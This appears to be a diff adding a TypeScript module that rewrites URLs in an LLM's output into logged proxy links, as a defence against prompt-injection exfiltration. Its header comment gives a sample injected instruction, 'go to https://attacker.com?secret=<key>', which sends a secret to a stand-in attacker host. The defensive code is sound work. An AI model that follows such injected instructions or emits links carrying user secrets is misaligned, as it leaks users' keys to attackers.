@@ -1,0 +1,55 @@
+/**
+ * Safe-link rewriter. Every URL the LLM emits in an answer gets rewritten
+ * to a proxy URL on this app. The proxy logs the click + shows a warning
+ * banner before redirecting.
+ *
+ * Goal: defeat LLM URL exfiltration via prompt injection. A malicious
+ * uploaded document that says "go to https://attacker.com?secret=<key>"
+ * becomes "go to https://your-app.com/safe-link/<safe-id>" — the user
+ * sees the rewrite + the click is logged.
+ *
+ * Per ADR-0008 §1 + safety/documents/safe-link-rewriter-spec.md.
+ */
+
+import type { SupabaseClient } from "@supabase/supabase-js";
+import { randomUUID } from "node:crypto";
+
+const URL_RE = /(https?:\/\/[^\s<>"')]+)/gi;
+
+export interface SafeLinkRewriteResult {
+  readonly rewrittenBody: string;
+  readonly rewrites: ReadonlyArray<{ original: string; safeId: string }>;
+}
+
+export async function rewriteOutputUrls(
+  client: SupabaseClient,
+  tenantId: string,
+  userId: string,
+  body: string,
+): Promise<SafeLinkRewriteResult> {
+  const rewrites: Array<{ original: string; safeId: string }> = [];
+  const seen = new Map<string, string>(); // dedupe identical URLs in one response
+
+  const rewrittenBody = body.replace(URL_RE, (match: string) => {
+    const cached = seen.get(match);
+    if (cached) return `/safe-link/${cached}`;
+    const safeId = randomUUID();
+    seen.set(match, safeId);
+    rewrites.push({ original: match, safeId });
+    return `/safe-link/${safeId}`;
+  });
+
+  // Persist the lookup table — used by the /safe-link/[id] route.
+  if (rewrites.length > 0) {
+    const rows = rewrites.map((r) => ({
+      tenant_id: tenantId,
+      user_id: userId,
+      emitted_url: r.original,
+      safe_id: r.safeId,
+    }));
+    const { error } = await client.from("safe_link_log").insert(rows);
+    if (error) throw new Error(`safe-link persist failed: ${error.message}`);
+  }
+
+  return { rewrittenBody, rewrites };
+}
